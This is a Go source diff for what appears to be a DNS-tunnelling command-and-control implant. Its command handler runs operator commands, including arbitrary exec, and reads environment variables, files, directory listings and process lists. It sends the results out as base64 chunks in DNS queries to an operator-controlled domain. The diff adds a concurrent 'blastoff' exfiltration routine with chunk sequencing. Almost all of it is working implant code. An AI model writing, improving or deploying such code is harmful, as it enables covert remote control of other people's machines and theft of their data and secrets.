@@ -15,6 +15,7 @@ import (
 	"path/filepath"
 	"strconv"
 	"strings"
+	"sync"
 	"syscall"
 	"time"
 
@@ -123,9 +124,7 @@ func runCommand(commandStr string, cmdid string) error {
 			process = processList[x]
 			data := fmt.Sprintf("%d\t%s\n", process.Pid(), process.Executable())
 
-			for _, chunk := range split(data, 30) {
-				sendARecord(chunk, msgid)
-			}
+			go blastoff(data, msgid)
 
 			// do os.* stuff on the pid
 		}
@@ -133,23 +132,17 @@ func runCommand(commandStr string, cmdid string) error {
 	case "env":
 		data := strings.Join(os.Environ(), "\n")
 		msgid := randSeq(10)
-		for _, chunk := range split(data, 30) {
-			sendARecord(chunk, msgid)
-		}
+		go blastoff(data, msgid)
 		sendARecordWD(workingDir())
 	case "whoami":
 		data, _ := user.Current()
 		msgid := randSeq(10)
-		for _, chunk := range split(data.Username, 30) {
-			sendARecord(chunk, msgid)
-		}
+		go blastoff(data.Username, msgid)
 		sendARecordWD(workingDir())
 	case "pwd":
 		data, _ := os.Getwd()
 		msgid := randSeq(10)
-		for _, chunk := range split(data, 30) {
-			sendARecord(chunk, msgid)
-		}
+		go blastoff(data, msgid)
 		sendARecordWD(workingDir())
 	case "ls":
 		var path string
@@ -161,16 +154,12 @@ func runCommand(commandStr string, cmdid string) error {
 		list := list(path)
 		data := strings.Join(list, "\n")
 		msgid := randSeq(10)
-		for _, chunk := range split(data, 30) {
-			sendARecord(chunk, msgid)
-		}
+		go blastoff(data, msgid)
 		sendARecordWD(workingDir())
 	case "cat":
 		data := cat(arrCommandStr[1])
 		msgid := randSeq(10)
-		for _, chunk := range split(data, 30) {
-			sendARecord(chunk, msgid)
-		}
+		go blastoff(data, msgid)
 		sendARecordWD(workingDir())
 	case "cd":
 		if len(arrCommandStr) > 1 {
@@ -181,7 +170,6 @@ func runCommand(commandStr string, cmdid string) error {
 	case "kill":
 		os.Exit(0)
 	default:
-		fmt.Println("Not OPSEC safe...")
 		cmd := exec.Command(arrCommandStr[0], arrCommandStr[1:]...)
 		var out bytes.Buffer
 		var stderr bytes.Buffer
@@ -195,14 +183,37 @@ func runCommand(commandStr string, cmdid string) error {
 		sendARecordWD(workingDir())
 
 		msgid := randSeq(15)
-		for _, chunk := range split(out.String(), 30) {
-
-			fmt.Println(chunk)
-			sendARecord(chunk, msgid)
-		}
+		go blastoff(out.String(), msgid)
 		return nil
 	}
 	return nil
+}
+
+//need to piece this back together...
+func blastoff(data string, msgid string) {
+
+	sliceLength := len(split(data, 30))
+	slice := split(data, 30)
+
+	var wg sync.WaitGroup
+	wg.Add(sliceLength)
+	fmt.Println("Running for loop…")
+	for i := 0; i < sliceLength; i++ {
+		go func(i int) {
+			defer wg.Done()
+			sendARecordBlast(slice[i], msgid, sliceLength, i)
+		}(i)
+	}
+	wg.Wait()
+
+}
+
+func slowaf(data string, msgid string) {
+
+	for _, chunk := range split(data, 30) {
+		sendARecord(chunk, msgid)
+	}
+
 }
 
 func sendARecordWD(rec string) {
@@ -260,6 +271,27 @@ func sendARecordHostname() {
 func sendARecord(rec string, msgid string) {
 	encoded := base64.StdEncoding.EncodeToString([]byte(rec))
 	encoded = strings.Replace(encoded, "=", "", -1)
+
+	msg := encoded + "." + msgid + "." + sessionID + "." + baseurl
+
+	fmt.Println(msg)
+
+	r := &net.Resolver{
+		PreferGo: true,
+		Dial: func(ctx context.Context, network, address string) (net.Conn, error) {
+			d := net.Dialer{
+				Timeout: time.Millisecond * time.Duration(20000),
+			}
+			return d.DialContext(ctx, network, dnsfull)
+		},
+	}
+	r.LookupHost(context.Background(), msg)
+}
+
+func sendARecordBlast(rec string, msgid string, msgLength int, msgLoc int) {
+	encoded := base64.StdEncoding.EncodeToString([]byte(rec))
+	encoded = strings.Replace(encoded, "=", "", -1)
+	encoded = strconv.Itoa(msgLength-1) + "-" + strconv.Itoa(msgLoc) + "-" + encoded
 
 	msg := encoded + "." + msgid + "." + sessionID + "." + baseurl
 
